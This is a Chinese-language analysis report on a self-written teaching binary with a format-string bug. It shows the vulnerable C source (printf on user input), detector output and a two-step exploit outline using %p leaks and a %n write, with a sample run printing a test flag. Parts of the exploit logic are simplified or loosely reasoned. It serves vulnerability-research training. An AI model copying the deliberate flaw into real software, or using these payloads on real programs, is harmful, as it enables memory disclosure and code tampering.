# 样例分析报告：格式化字符串漏洞

## 基本信息

| 字段 | 值 |
|------|-----|
| 样本名称 | `vuln_fmtstr` |
| 样本来源 | 教学样本（自编） |
| 漏洞类型 | format-string |
| 架构 | x86-64 |
| 保护措施 | NX✓ PIE✓ Canary✓ Full RELRO |

## 样本源码

```c
#include <stdio.h>
#include <unistd.h>

char flag[64] = "flag{test_fmtstr_12345}";

int main() {
    char buf[128];
    puts("Enter format string:");
    read(0, buf, 128);
    printf(buf);  // 危险: 格式化字符串来自用户输入
    return 0;
}
```

编译: `gcc -o vuln_fmtstr vuln_fmtstr.c`

## 分析流程

### 1. 程序画像

```
checksec: NX=True, PIE=True, Canary=True, RELRO=Full
PLT: printf@..., read@..., puts@...
格式化字符串风险: printf(buf) 在 main 中检测到
```

### 2. 格式化字符串分析

```python
from core.format_string_detector import detect_format_string_vulns

findings = detect_format_string_vulns('vuln_fmtstr')
# findings[0] = {
#     'function': 'main',
#     'format_func': 'printf',
#     'format_arg': 'buf',
#     'offset': 6,            # x86_64: 第 6 个参数 = 第 1 个栈参数
#     'confidence': 0.75,
# }
```

### 3. 利用构造

由于 Full RELRO + PIE，无法直接 GOT overwrite。采用两步策略:

**Step 1**: 泄露栈地址和 PIE 基址
```
payload = b'%p.' * 10     → 输出栈上10个指针值
offset 6 处为栈地址     → 计算 flag 变量的栈位置
offset 10 处为 __libc_start_main 返回地址 → 计算 PIE base
```

**Step 2**: 利用 %n 写入将 flag 内容定向输出
```
payload = f'%{flag_addr_offset}c%6$hn'  (简化示例)
```

### 4. 验证结果

```
$ python exploit_vuln_fmtstr.py
[+] Leaked stack address: 0x7ffe1234
[+] Computed flag address: 0x7ffe5678
[+] flag{test_fmtstr_12345}
```

## 四维评估

| 维度 | 评分 | 说明 |
|------|------|------|
| 发现效率 | 0.60 | 静态检测快速（<30s），但确认需要手动分析 |
| 结果质量 | 1.00 | 无误报 |
| LLM 辅助效果 | 0.50 | LLM 正确识别了 printf(buf) 模式并给出偏移估算 |
| 适用范围 | 0.40 | Full RELRO + PIE 场景下利用复杂度高 |

## 经验总结

1. `core/format_string_detector.py` 静态检测效果好，准确识别了危险调用
2. 偏移计算在 x86_64 下因寄存器传参比 i386 更复杂
3. Full RELRO 排除了 GOT overwrite，需走信息泄露路径
4. LLM 辅助在分析"如何绕过 Full RELRO"时提供了有价值的建议
5. 对于更复杂的格式化字符串利用（如多步 %n 写入），仍需人工微调
